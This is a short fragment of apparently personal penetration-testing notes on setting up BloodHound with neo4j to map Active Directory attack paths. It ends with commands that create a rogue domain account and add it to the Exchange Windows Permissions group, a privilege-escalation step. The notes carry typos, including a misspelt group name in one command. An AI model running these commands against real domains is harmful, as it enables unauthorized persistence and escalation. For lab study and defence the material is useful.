-   Run `sudo neo4j console`, which opens the `neo4j` web interface
-   Log in at `http://127.0.0.1:7474/` with username/password “neo4j”/”neo4j”. You’ll have to change your password on login. Close the window (but don’t exit `neo4j` in the console).
-   Run `bloodhound` from a new terminal window. Log in with the creds you just set
-   Click on the “Upload Data” button or Drag n Drop the zip file.

[Usage](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux#sharphound)

- "Show Path from owned principles" slected and right click on link betweem them to get info for abuse

> Account Operators has Generic All privilege on the Exchange Windows Permissions group

- Before Doing any exploitation make your own user account from current privilege account
	```
	# add user
	net user x3rz x3rz@123 /add /domain
	# list users
	net users
	# put our user to excahnge windows permissions
	net group "Exchange Windows Permissions"
	net group "Exchainge Windows Pemissions" /add x3rz
	
	
	
	```